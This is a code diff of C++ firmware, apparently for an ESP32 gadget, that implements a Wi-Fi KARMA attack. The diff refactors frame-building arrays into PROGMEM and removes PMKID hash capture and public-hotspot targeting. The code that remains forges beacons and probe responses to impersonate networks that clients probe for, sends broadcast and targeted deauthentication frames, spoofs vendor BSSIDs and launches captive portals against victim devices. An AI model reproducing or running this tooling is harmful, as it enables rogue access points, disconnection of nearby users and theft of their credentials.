@@ -25,7 +25,7 @@
 
 #ifndef KARMA_CHANNELS
 #define KARMA_CHANNELS
-const uint8_t karma_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
+const uint8_t karma_channels[] PROGMEM = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
 #endif
 
 #define FILENAME "probe_capture_"
@@ -44,7 +44,7 @@ const uint8_t karma_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14}
 #define MAX_CONCURRENT_SSIDS 8
 #define MAC_ROTATION_INTERVAL 30000
 
-const uint8_t vendorOUIs[][3] = {
+const uint8_t vendorOUIs[][3] PROGMEM = {
     {0x00, 0x50, 0xF2}, {0x00, 0x1A, 0x11}, {0x00, 0x1B, 0x63}, {0x00, 0x24, 0x01},
     {0x00, 0x0C, 0x29}, {0x00, 0x1D, 0x0F}, {0x00, 0x26, 0x5E}, {0x00, 0x19, 0xE3},
     {0x00, 0x21, 0x91}, {0x00, 0x1E, 0x8C}, {0x00, 0x12, 0x17}, {0x00, 0x18, 0xDE},
@@ -52,8 +52,22 @@ const uint8_t vendorOUIs[][3] = {
     {0x00, 0x14, 0x6C}, {0x00, 0x25, 0x9C}, {0x00, 0x11, 0x22}, {0x00, 0x16, 0x6F}
 };
 
-const uint8_t priorityChannels[] = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
+const uint8_t priorityChannels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 4, 9, 5, 10, 12, 13};
 #define NUM_PRIORITY_CHANNELS 13
+
+const uint8_t beacon_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
+const uint8_t probe_rates[] PROGMEM = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
+const uint8_t ext_rates[] PROGMEM = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
+const uint8_t rsn_wpa3[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
+                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
+                                    0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
+const uint8_t rsn_wpa2[] PROGMEM = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
+                                    0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
+                                    0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
+const uint8_t ht_cap[] PROGMEM = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
+                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+const uint8_t rotate_channels[] PROGMEM = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
 
 std::vector<String> SSIDDatabase::ssidCache;
 bool SSIDDatabase::cacheLoaded = false;
@@ -328,10 +342,9 @@ void ActiveBroadcastAttack::broadcastSSID(const String &ssid) {
 }
 
 void ActiveBroadcastAttack::rotateChannel() {
-    static const uint8_t channels[] = {1, 6, 11, 3, 8, 2, 7, 12, 4, 9, 5, 10, 13, 14};
     static size_t channelIndex = 0;
-    channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
-    currentChannel = channels[channelIndex];
+    channelIndex = (channelIndex + 1) % (sizeof(rotate_channels) / sizeof(rotate_channels[0]));
+    currentChannel = pgm_read_byte(&rotate_channels[channelIndex]);
 }
 
 void ActiveBroadcastAttack::sendBeaconFrame(const String &ssid, uint8_t channel) {
@@ -614,11 +627,6 @@ uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest
     if (sinceLast < 5000) score += 15;
     else if (sinceLast < 15000) score += 10;
     else if (sinceLast < 30000) score += 5;
-    String ssidLower = probe.ssid;
-    ssidLower.toLowerCase();
-    if (ssidLower.indexOf("starbucks") != -1 || ssidLower.indexOf("xfinity") != -1 ||
-        ssidLower.indexOf("att") != -1 || ssidLower.indexOf("spectrum") != -1 ||
-        ssidLower.indexOf("comcast") != -1 || ssidLower.indexOf("tmobile") != -1) score += 10;
     return min(score, (uint8_t)100);
 }
 
@@ -641,7 +649,7 @@ uint16_t getPortalDuration(AttackTier tier) {
 
 void generateRandomBSSID(uint8_t *bssid) {
     uint8_t vendorIndex = esp_random() % (sizeof(vendorOUIs) / 3);
-    memcpy(bssid, vendorOUIs[vendorIndex], 3);
+    memcpy_P(bssid, vendorOUIs[vendorIndex], 3);
     bssid[3] = esp_random() & 0xFF;
     bssid[4] = esp_random() & 0xFF;
     bssid[5] = esp_random() & 0xFF;
@@ -689,11 +697,10 @@ size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid,
         memcpy(&buffer[pos], ssid.c_str(), ssid.length());
         pos += ssid.length();
     }
-    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c};
     buffer[pos++] = 0x01;
-    buffer[pos++] = sizeof(rates);
-    memcpy(&buffer[pos], rates, sizeof(rates));
-    pos += sizeof(rates);
+    buffer[pos++] = sizeof(probe_rates);
+    memcpy_P(&buffer[pos], probe_rates, sizeof(probe_rates));
+    pos += sizeof(probe_rates);
     buffer[pos++] = 0x03;
     buffer[pos++] = 0x01;
     buffer[pos++] = channel;
@@ -706,36 +713,26 @@ size_t buildEnhancedProbeResponse(uint8_t *buffer, const String &ssid,
     buffer[pos++] = 0x2a;
     buffer[pos++] = 0x01;
     buffer[pos++] = 0x00;
-    uint8_t extRates[] = {0x32, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60};
     buffer[pos++] = 0x32;
-    buffer[pos++] = sizeof(extRates);
-    memcpy(&buffer[pos], extRates, sizeof(extRates));
-    pos += sizeof(extRates);
+    buffer[pos++] = sizeof(ext_rates);
+    memcpy_P(&buffer[pos], ext_rates, sizeof(ext_rates));
+    pos += sizeof(ext_rates);
     if (rsn.akmSuite > 0) {
         buffer[pos++] = 0x30;
         if (rsn.akmSuite == 2) {
-            uint8_t rsnData[] = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
-            buffer[pos++] = sizeof(rsnData);
-            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
-            pos += sizeof(rsnData);
+            buffer[pos++] = sizeof(rsn_wpa3);
+            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
+            pos += sizeof(rsn_wpa3);
         } else {
-            uint8_t rsnData[] = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
-            buffer[pos++] = sizeof(rsnData);
-            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
-            pos += sizeof(rsnData);
+            buffer[pos++] = sizeof(rsn_wpa2);
+            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
+            pos += sizeof(rsn_wpa2);
         }
     }
     buffer[pos++] = 0x2d;
     buffer[pos++] = 0x1a;
-    uint8_t htCap[] = {0xef, 0x09, 0x1b, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
-                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    memcpy(&buffer[pos], htCap, sizeof(htCap));
-    pos += sizeof(htCap);
+    memcpy_P(&buffer[pos], ht_cap, sizeof(ht_cap));
+    pos += sizeof(ht_cap);
     buffer[pos++] = 0x7f;
     buffer[pos++] = 0x04;
     buffer[pos++] = 0x00;
@@ -777,30 +774,23 @@ size_t buildBeaconFrame(uint8_t *buffer, const String &ssid, uint8_t channel, co
         memcpy(&buffer[pos], ssid.c_str(), ssid.length());
         pos += ssid.length();
     }
-    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x0c, 0x12, 0x96, 0x18, 0x24};
     buffer[pos++] = 0x01;
-    buffer[pos++] = sizeof(rates);
-    memcpy(&buffer[pos], rates, sizeof(rates));
-    pos += sizeof(rates);
+    buffer[pos++] = sizeof(beacon_rates);
+    memcpy_P(&buffer[pos], beacon_rates, sizeof(beacon_rates));
+    pos += sizeof(beacon_rates);
     buffer[pos++] = 0x03;
     buffer[pos++] = 0x01;
     buffer[pos++] = channel;
     if (rsn.akmSuite > 0) {
         buffer[pos++] = 0x30;
         if (rsn.akmSuite == 2) {
-            uint8_t rsnData[] = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                0xAC, 0x08, 0xAC, 0x01, 0x00, 0x00};
-            buffer[pos++] = sizeof(rsnData);
-            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
-            pos += sizeof(rsnData);
+            buffer[pos++] = sizeof(rsn_wpa3);
+            memcpy_P(&buffer[pos], rsn_wpa3, sizeof(rsn_wpa3));
+            pos += sizeof(rsn_wpa3);
         } else {
-            uint8_t rsnData[] = {0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00,
-                                0x00, 0x0F, 0xAC, 0x04, 0x01, 0x00, 0x00, 0x0F,
-                                0xAC, 0x02, 0x00, 0x00, 0x00, 0x00};
-            buffer[pos++] = sizeof(rsnData);
-            memcpy(&buffer[pos], rsnData, sizeof(rsnData));
-            pos += sizeof(rsnData);
+            buffer[pos++] = sizeof(rsn_wpa2);
+            memcpy_P(&buffer[pos], rsn_wpa2, sizeof(rsn_wpa2));
+            pos += sizeof(rsn_wpa2);
         }
     }
     buffer[pos++] = 0x05;
@@ -840,11 +830,10 @@ void sendBeaconFrameHelper(const String &ssid, uint8_t channel) {
     beaconPacket[pos++] = ssid.length();
     memcpy(&beaconPacket[pos], ssid.c_str(), ssid.length());
     pos += ssid.length();
-    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
     beaconPacket[pos++] = 0x01;
-    beaconPacket[pos++] = sizeof(rates);
-    memcpy(&beaconPacket[pos], rates, sizeof(rates));
-    pos += sizeof(rates);
+    beaconPacket[pos++] = sizeof(beacon_rates);
+    memcpy_P(&beaconPacket[pos], beacon_rates, sizeof(beacon_rates));
+    pos += sizeof(beacon_rates);
     beaconPacket[pos++] = 0x03;
     beaconPacket[pos++] = 0x01;
     beaconPacket[pos++] = channel;
@@ -879,11 +868,10 @@ void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
     probeResponse[pos++] = ssid.length();
     memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
     pos += ssid.length();
-    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
     probeResponse[pos++] = 0x01;
-    probeResponse[pos++] = sizeof(rates);
-    memcpy(&probeResponse[pos], rates, sizeof(rates));
-    pos += sizeof(rates);
+    probeResponse[pos++] = sizeof(beacon_rates);
+    memcpy_P(&probeResponse[pos], beacon_rates, sizeof(beacon_rates));
+    pos += sizeof(beacon_rates);
     probeResponse[pos++] = 0x03;
     probeResponse[pos++] = 0x01;
     probeResponse[pos++] = channel;
@@ -1009,10 +997,10 @@ void smartChannelHop() {
     if (now - last_ChannelChange < hop_interval) return;
     if (channelActivity[channl] > 20) { hop_interval = DEFAULT_HOP_INTERVAL * 3; return; }
     currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
-    channl = priorityChannels[currentPriorityChannel] - 1;
+    channl = pgm_read_byte(&priorityChannels[currentPriorityChannel]) - 1;
     esp_wifi_set_promiscuous(false);
     wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-    esp_wifi_set_channel(priorityChannels[currentPriorityChannel], secondCh);
+    esp_wifi_set_channel(pgm_read_byte(&priorityChannels[currentPriorityChannel]), secondCh);
     delay(50);
     esp_wifi_set_promiscuous(true);
     last_ChannelChange = now;
@@ -1421,7 +1409,7 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
             behavior.probeCount = 1;
             behavior.avgRSSI = -50;
             behavior.probedSSIDs.push_back(ssid);
-            behavior.favoriteChannel = karma_channels[channl % 14];
+            behavior.favoriteChannel = pgm_read_byte(&karma_channels[channl % 14]);
             behavior.lastKarmaAttempt = 0;
             behavior.isVulnerable = true;
             clientBehaviors[mac] = behavior;
@@ -1429,7 +1417,7 @@ void handleBroadcastResponse(const String& ssid, const String& mac) {
             if (karmaConfig.enableAutoKarma) {
                 PendingPortal portal;
                 portal.ssid = ssid;
-                portal.channel = karma_channels[channl % 14];
+                portal.channel = pgm_read_byte(&karma_channels[channl % 14]);
                 portal.targetMAC = mac;
                 portal.timestamp = millis();
                 portal.launched = false;
@@ -1484,16 +1472,10 @@ void saveProbesToPCAP(FS &fs) {
         uint32_t ts_sec = probe.timestamp / 1000;
         uint32_t ts_usec = (probe.timestamp % 1000) * 1000;
         
-        if (probe.microseconds > 0) {
-            ts_sec = probe.microseconds / 1000000;
-            ts_usec = probe.microseconds % 1000000;
-        }
-        
         file.write((uint8_t*)&ts_sec, 4);
         file.write((uint8_t*)&ts_usec, 4);
         file.write((uint8_t*)&probe.frame_len, 4);
         file.write((uint8_t*)&probe.frame_len, 4);
-        
         file.write(probe.frame, probe.frame_len);
         written++;
     }
@@ -1524,81 +1506,10 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         snprintf(ap, sizeof(ap), "%02X:%02X:%02X:%02X:%02X:%02X",
                 frame[4], frame[5], frame[6], frame[7], frame[8], frame[9]);
         apMAC = String(ap);
-        Serial.printf("[ASSOC] %s trying to join %s\n", clientMAC.c_str(), apMAC.c_str());
         if (karmaConfig.enableDeauth) {
-            sendDeauth(clientMAC, karma_channels[channl % 14], false);
-            sendDeauth(apMAC, karma_channels[channl % 14], false);
+            sendDeauth(clientMAC, pgm_read_byte(&karma_channels[channl % 14]), false);
+            sendDeauth(apMAC, pgm_read_byte(&karma_channels[channl % 14]), false);
             assocBlocked++;
-            Serial.println("[DEAUTH] Association blocked");
-        }
-    }
-    
-    if (frameSubType == 0x0B || frameSubType == 0x00) {
-        int pos = 24;
-        while (pos + 1 < pkt->rx_ctrl.sig_len) {
-            uint8_t tag = frame[pos];
-            uint8_t len = frame[pos + 1];
-            
-            if (tag == 0x30 && len >= 22) {
-                if (pos + 2 + len <= pkt->rx_ctrl.sig_len) {
-                    String bssid = extractMAC(pkt);
-                    
-                    if (len >= 38) {
-                        char pmkid[33];
-                        for (int i = 0; i < 16; i++) {
-                            sprintf(&pmkid[i*2], "%02X", frame[pos + 2 + 20 + i]);
-                        }
-                        pmkid[32] = '\0';
-                        
-                        String ap_name = "";
-                        for (const auto &net : activeNetworks) {
-                            char net_bssid[18];
-                            snprintf(net_bssid, sizeof(net_bssid), 
-                                    "%02X:%02X:%02X:%02X:%02X:%02X",
-                                    net.bssid[0], net.bssid[1], net.bssid[2],
-                                    net.bssid[3], net.bssid[4], net.bssid[5]);
-                            
-                            if (bssid.equals(net_bssid)) {
-                                ap_name = net.ssid;
-                                break;
-                            }
-                        }
-                        
-                        Serial.printf("[PMKID] %s (%s) -> %s\n", 
-                                    bssid.c_str(), 
-                                    ap_name.length() ? ap_name.c_str() : "Unknown",
-                                    pmkid);
-                        
-                        FS *saveFs;
-                        if (getFsStorage(saveFs)) {
-                            if (!saveFs->exists("/ProbeData")) saveFs->mkdir("/ProbeData");
-                            
-                            File file = saveFs->open("/ProbeData/pmkid_22000.txt", FILE_APPEND);
-                            if (file) {
-                                file.printf("%s*%s*000000000000*%s*0\n",
-                                           pmkid,
-                                           bssid.c_str(),
-                                           ap_name.length() ? ap_name.c_str() : "Unknown");
-                                file.close();
-                            }
-                            
-                            File legacy = saveFs->open("/ProbeData/pmkid.txt", FILE_APPEND);
-                            if (legacy) {
-                                legacy.printf("%lu,%s,%s,%s\n", 
-                                             millis(), 
-                                             bssid.c_str(),
-                                             ap_name.c_str(),
-                                             pmkid);
-                                legacy.close();
-                            }
-                            
-                            pmkidCaptured++;
-                        }
-                    }
-                }
-                break;
-            }
-            pos += 2 + len;
         }
     }
     
@@ -1619,13 +1530,11 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     probe.ssid = ssid;
     probe.rssi = ctrl.rssi;
     probe.timestamp = millis();
-    probe.channel = karma_channels[channl % 14];
-    probe.encryption_type = (rsn.akmSuite > 0) ? 3 : 0;
+    probe.channel = pgm_read_byte(&karma_channels[channl % 14]);
     
     probe.frame_len = pkt->rx_ctrl.sig_len;
     if (probe.frame_len > 256) probe.frame_len = 256;
     memcpy(probe.frame, pkt->payload, probe.frame_len);
-    probe.microseconds = esp_timer_get_time();
     
     probeBuffer[probeBufferIndex] = probe;
     probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
@@ -1777,7 +1686,7 @@ void updateKarmaDisplay() {
         tft.setCursor(tftWidth/2, tftHeight - 90);
         tft.print("Pending: " + String(pendingPortals.size()));
         tft.setCursor(tftWidth/2, tftHeight - 80);
-        tft.print("Ch: " + String(karma_channels[channl % 14]));
+        tft.print("Ch: " + String(pgm_read_byte(&karma_channels[channl % 14])));
         tft.setCursor(tftWidth/2, tftHeight - 70);
         String hopStatus = String(auto_hopping ? "A:" : "M:") + String(hop_interval) + "ms";
         tft.print(hopStatus);
@@ -1930,7 +1839,7 @@ void karma_setup() {
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
     wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-    esp_wifi_set_channel(karma_channels[channl % 14], secondCh);
+    esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
     isInitialized = true;
     vTaskDelay(1000 / portTICK_RATE_MS);
     screenNeedsRedraw = true;
@@ -1943,7 +1852,7 @@ void karma_setup() {
             esp_wifi_start();
             esp_wifi_set_promiscuous(true);
             esp_wifi_set_promiscuous_rx_cb(probe_sniffer);
-            esp_wifi_set_channel(karma_channels[channl % 14], secondCh);
+            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
             screenNeedsRedraw = true;
         }
         if (returnToMenu) {
@@ -1959,7 +1868,7 @@ void karma_setup() {
         rotateBSSID();
         if (karmaConfig.enableSmartHop) smartChannelHop();
         if (karmaConfig.enableDeauth && (currentTime - lastDeauthTime > DEAUTH_INTERVAL)) {
-            sendDeauth("FF:FF:FF:FF:FF:FF", karma_channels[channl % 14], true);
+            sendDeauth("FF:FF:FF:FF:FF:FF", pgm_read_byte(&karma_channels[channl % 14]), true);
             lastDeauthTime = currentTime;
         }
         if (attackConfig.enableBeaconing) sendBeaconFrames();
@@ -1974,7 +1883,7 @@ void karma_setup() {
             channl++;
             if (channl >= 14) channl = 0;
             wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
-            esp_wifi_set_channel(karma_channels[channl % 14], secondCh);
+            esp_wifi_set_channel(pgm_read_byte(&karma_channels[channl % 14]), secondCh);
             screenNeedsRedraw = true;
             vTaskDelay(50 / portTICK_RATE_MS);
             esp_wifi_set_promiscuous(true);
@@ -2479,7 +2388,7 @@ void karma_setup() {
             if (templateSelected) padprintln("Template: " + selectedTemplate.name);
             else padprintln("Template: None");
             padprintln(String(BTN_ALIAS) + ": Enhanced Menu");
-            tft.drawRightString("Ch." + String(karma_channels[channl % 14]) + "(Next)",
+            tft.drawRightString("Ch." + String(pgm_read_byte(&karma_channels[channl % 14])) + "(Next)",
                                tftWidth - 10, tftHeight - 18, 1);
             tft.drawString("Prev: Options", 10, tftHeight - 18, 1);
         }
